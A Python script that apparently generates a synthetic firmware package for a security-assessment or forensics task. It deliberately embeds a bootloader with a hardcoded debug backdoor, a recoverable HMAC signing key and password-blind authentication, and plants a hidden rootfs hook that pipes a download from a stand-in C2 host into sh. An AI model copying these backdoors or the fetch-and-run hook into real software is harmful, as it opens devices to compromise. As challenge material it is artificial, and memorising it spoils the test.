#!/usr/bin/env python3
"""Generate a firmware update package with deliberate security weaknesses for assessment."""

import struct
import zlib
import hashlib
import hmac as hmac_mod
import json
import os
import subprocess
import sys

# === Security Parameters (embedded in bootloader ELF) ===
DEBUG_KEY = "Gh0st_D3bug_K3y!"
DEBUG_XOR_MASK = 0x5A
HMAC_KEY = "NX7800_FIRMWARE_SIGNING_KEY_V3.1"
HMAC_XOR_MASK = 0xA7

# === Config encryption parameters ===
CONFIG_XOR_SEED = 0xDEAD1337
DEVICE_ID = "NX-7800-PROTO"


def encode_varint(value):
    """Encode unsigned integer as variable-length byte sequence."""
    result = bytearray()
    while value >= 0x80:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)


def xor_crypt(data, seed, start_offset=0):
    """XOR encrypt/decrypt data with rotating key derived from seed."""
    seed_bytes = struct.pack('<I', seed)
    result = bytearray()
    for i, b in enumerate(data):
        pos = start_offset + i
        key_byte = seed_bytes[pos % 4] ^ (pos & 0xFF)
        result.append(b ^ key_byte)
    return bytes(result)


def generate_backdoor_c():
    """Generate C source for bootloader with embedded backdoor and HMAC key."""
    debug_enc = [b ^ DEBUG_XOR_MASK for b in DEBUG_KEY.encode()]
    hmac_enc = [b ^ HMAC_XOR_MASK for b in HMAC_KEY.encode()]

    debug_hex = ", ".join(f"0x{b:02X}" for b in debug_enc)
    hmac_hex = ", ".join(f"0x{b:02X}" for b in hmac_enc)

    return f"""\
#include <stdint.h>

/* NX-7800 Platform Bootloader */

/* ====== Debug Authentication Module ====== */
#define AUTH_XOR_MASK 0x{DEBUG_XOR_MASK:02X}

static const uint8_t _debug_auth_token[{len(debug_enc)}] = {{
    {debug_hex}
}};

int __attribute__((used)) debug_authenticate(const char *input) {{
    int i;
    for (i = 0; i < {len(debug_enc)}; i++) {{
        if ((uint8_t)input[i] != (_debug_auth_token[i] ^ AUTH_XOR_MASK))
            return 0;
    }}
    return 0xDEADBEEF;
}}

/* ====== Firmware Integrity Verification ====== */
#define HMAC_XOR_MASK 0x{HMAC_XOR_MASK:02X}

static const uint8_t _hmac_key_enc[{len(hmac_enc)}] = {{
    {hmac_hex}
}};

void __attribute__((used)) get_hmac_key(uint8_t *out) {{
    int i;
    for (i = 0; i < {len(hmac_enc)}; i++) {{
        out[i] = _hmac_key_enc[i] ^ HMAC_XOR_MASK;
    }}
}}

/* ====== Standard Authentication ====== */
int __attribute__((used)) auth_user(const char *user, const char *pass) {{
    int ulen = 0, plen = 0;
    while (user[ulen]) ulen++;
    while (pass[plen]) plen++;
    if (ulen == 0 || plen < 8) return 0;
    return 1;
}}

/* ====== Entry Point ====== */
void _start() {{
    while(1);
}}
"""


def compile_bootloader():
    """Generate and compile the bootloader ELF binary."""
    c_source = generate_backdoor_c()

    c_path = "/tmp/backdoor.c"
    elf_path = "/tmp/bootloader.elf"

    with open(c_path, "w") as f:
        f.write(c_source)

    result = subprocess.run(
        ["gcc", "-O0", "-no-pie", "-nostdlib", "-fno-stack-protector",
         "-fno-builtin", "-o", elf_path, c_path],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"Compilation error: {result.stderr}", file=sys.stderr)
        raise RuntimeError("Failed to compile bootloader")

    with open(elf_path, "rb") as f:
        return f.read()


def build_config_section(entries, xor_seed):
    """Build CNFG format config section with XOR encryption."""
    data = bytearray()
    data += b"CNFG"
    data += encode_varint(len(entries))
    data += struct.pack("<I", xor_seed)

    byte_offset = 0
    for key_str, value_type, value in entries:
        key_bytes = key_str.encode("utf-8")
        key_enc = xor_crypt(key_bytes, xor_seed, byte_offset)
        byte_offset += len(key_bytes)

        data += encode_varint(len(key_enc))
        data += key_enc
        data += struct.pack("B", value_type)

        if value_type == 0x01:
            val_bytes = value.encode("utf-8")
        elif value_type == 0x02:
            val_bytes = struct.pack("<i", value)
        elif value_type == 0x03:
            val_bytes = value if isinstance(value, bytes) else value.encode()
        else:
            raise ValueError(f"Unknown value type: {value_type}")

        val_enc = xor_crypt(val_bytes, xor_seed, byte_offset)
        byte_offset += len(val_bytes)

        data += encode_varint(len(val_enc))
        data += val_enc

    return bytes(data)


def build_firmware():
    """Build the complete firmware update package."""
    # Compile the bootloader ELF with embedded backdoor
    bootloader_data = compile_bootloader()
    print(f"Bootloader ELF compiled: {len(bootloader_data)} bytes")

    # Build kernel section (simulated Linux kernel image)
    kernel_data = bytearray()
    kernel_data += b"\x7fELF\x01\x01\x01\x00"
    kernel_data += bytes(8)
    kernel_data += struct.pack("<HHI", 2, 40, 1)
    kernel_data += bytes(2048)
    kernel_data += b"Linux version 5.15.42-custom (builder@ci) (gcc 12.2.0) #1 SMP PREEMPT\x00"
    kernel_data += bytes(4096)
    kernel_data += b"KERNEL_BUILD_ID=a8f3e2d1c9b04567\x00"
    kernel_data += bytes(2048)

    # Build rootfs section with supply-chain anomaly
    rootfs_data = bytearray()
    rootfs_data += b"ROOTFS\x00\x00"

    rootfs_files = [
        ("/etc/hostname", b"nx-7800-proto\n"),
        ("/etc/passwd",
         b"root:x:0:0:root:/root:/bin/sh\n"
         b"nobody:x:65534:65534:nobody:/:/usr/sbin/nologin\n"),
        ("/etc/network/interfaces",
         b"auto eth0\niface eth0 inet dhcp\n"),
        ("/usr/share/firmware/version.txt",
         b"3.1.7-rc2-build.4521-g8a3f2d1\n"),
        ("/var/log/boot.log",
         b"[    0.000000] Booting Linux on physical CPU 0x0\n"
         b"[    0.000000] Linux version 5.15.42-custom\n"
         b"[    0.001234] Machine model: NX-7800 Prototype\n"),
        # Supply chain compromise: unauthorized file not in manifest
        ("/tmp/.update_hook",
         b"#!/bin/sh\n"
         b"curl -s http://c2.malicious.internal:8443/stage2 | sh\n"
         b"# deployed: 2024-06-28T03:14:00Z\n"),
    ]

    for path, content in rootfs_files:
        path_bytes = path.encode("utf-8")
        rootfs_data += struct.pack("<H", len(path_bytes))
        rootfs_data += path_bytes
        rootfs_data += struct.pack("<I", len(content))
        rootfs_data += content
    rootfs_data += struct.pack("<H", 0)  # End marker

    # Build config section
    config_entries = [
        ("firmware.version", 0x01, "3.1.7-rc2"),
        ("hardware.revision", 0x02, 42),
        ("network.gateway", 0x01, "10.0.77.1"),
        ("security.auth_mode", 0x01, "certificate-pinned"),
        ("boot.watchdog_timeout_ms", 0x02, 15000),
        ("storage.partition_table", 0x01, "gpt-hybrid"),
        ("crypto.key_derivation", 0x01, "scrypt-16384-8-1"),
        ("update.channel", 0x01, "staging-canary"),
        ("system.max_threads", 0x02, 256),
        ("debug.uart_baud", 0x02, 921600),
        ("telemetry.endpoint", 0x01, "https://telemetry.internal.corp/v2/ingest"),
        ("recovery.magic_key_combo", 0x01, "VOL_UP+VOL_DOWN+POWER"),
        ("display.framebuffer_addr", 0x02, 0x3F000000),
        ("audio.codec_id", 0x01, "WM8960-I2S"),
    ]
    config_data = build_config_section(config_entries, CONFIG_XOR_SEED)

    # Build manifest section - contains mismatches with actual firmware
    manifest_content = {
        "build_number": 4521,
        "build_hash": "8a3f2d1c9b045678deab1234",
        "build_date": "2024-03-15T08:30:00Z",
        "target": "nx-7800",
        "signed_by": "release-signer-02",
        "expected_files": [
            "/etc/hostname",
            "/etc/passwd",
            "/etc/network/interfaces",
            "/usr/share/firmware/version.txt",
            "/var/log/boot.log"
            # Note: /tmp/.update_hook is NOT listed here
        ],
        "components": ["bootloader", "kernel", "rootfs", "config"],
        "signature_algorithm": "ed25519",  # MISMATCH: actual signing uses HMAC-SHA256
        "rollback_version": "3.1.6",
        "min_battery_pct": 25,
    }
    manifest_json = json.dumps(manifest_content, separators=(',', ':')).encode("utf-8")
    manifest_data = b"MNFT" + struct.pack("<I", len(manifest_json)) + manifest_json

    # Section definitions: (type, flags, name, raw_data, compression_method)
    # compression: 0=none, 1=zlib, 2=custom_lz (0xCAFE prefix + zlib)
    sections_raw = [
        (1, 0x01, b"bootloader", bootloader_data, 2),   # custom_lz compression
        (2, 0x02, b"kernel", bytes(kernel_data), 1),      # standard zlib
        (3, 0x01, b"rootfs", bytes(rootfs_data), 1),      # standard zlib
        (4, 0x04, b"config", config_data, 1),              # standard zlib
        (5, 0x01, b"manifest", manifest_data, 1),          # standard zlib
    ]

    compressed_sections = []
    for sec_type, sec_flags, sec_name, raw_data, compression in sections_raw:
        if compression == 2:
            compressed = bytes([0xCA, 0xFE]) + zlib.compress(raw_data, 6)
        elif compression == 1:
            compressed = zlib.compress(raw_data, 6)
        else:
            compressed = raw_data

        crc = zlib.crc32(raw_data) & 0xFFFFFFFF
        compressed_sections.append({
            'type': sec_type,
            'flags': sec_flags,
            'name': sec_name,
            'compressed': compressed,
            'decompressed_size': len(raw_data),
            'compression': compression,
            'checksum': crc,
        })

    NUM_SECTIONS = len(compressed_sections)

    # Build 64-byte FWPK header
    # Timestamp is backdated to Nov 2023 (before manifest build_date of Mar 2024)
    MAGIC = b"FWPK"
    VERSION = 0x0301
    FLAGS = 0x00000042
    TIMESTAMP = 1700000000  # Nov 14, 2023

    header = bytearray(0x40)
    struct.pack_into("4s", header, 0x00, MAGIC)
    struct.pack_into("<H", header, 0x04, VERSION)
    struct.pack_into("<H", header, 0x06, NUM_SECTIONS)
    struct.pack_into("<I", header, 0x0C, FLAGS)
    struct.pack_into("<I", header, 0x10, TIMESTAMP)

    device_id_bytes = DEVICE_ID.encode().ljust(16, b'\x00')
    header[0x14:0x24] = device_id_bytes

    # CRC32 of first 8 bytes (magic + version + num_sections)
    hdr_crc = zlib.crc32(bytes(header[:8])) & 0xFFFFFFFF
    struct.pack_into("<I", header, 0x08, hdr_crc)

    # Build variable-length section table
    section_table = bytearray()
    for sec in compressed_sections:
        section_table += struct.pack("B", sec['type'])
        section_table += struct.pack("B", sec['flags'])
        section_table += struct.pack("B", len(sec['name']))
        section_table += sec['name']
        section_table += struct.pack("<I", len(sec['compressed']))
        section_table += struct.pack("<I", sec['decompressed_size'])
        section_table += struct.pack("B", sec['compression'])
        section_table += struct.pack("<I", sec['checksum'])

    # Data region: compressed sections concatenated in order
    data_region = bytearray()
    for sec in compressed_sections:
        data_region += sec['compressed']

    # Assemble body
    body = bytes(header) + bytes(section_table) + bytes(data_region)

    # HMAC-SHA256 signature block (key embedded in bootloader ELF)
    hmac_key = HMAC_KEY.encode('ascii')
    hmac_digest = hmac_mod.new(hmac_key, body, hashlib.sha256).digest()
    hmac_block = b"HMAC" + hmac_digest

    firmware = body + hmac_block
    return firmware


if __name__ == "__main__":
    fw = build_firmware()
    os.makedirs("/app", exist_ok=True)
    with open("/app/firmware.bin", "wb") as f:
        f.write(fw)
    print(f"Firmware image generated: {len(fw)} bytes")
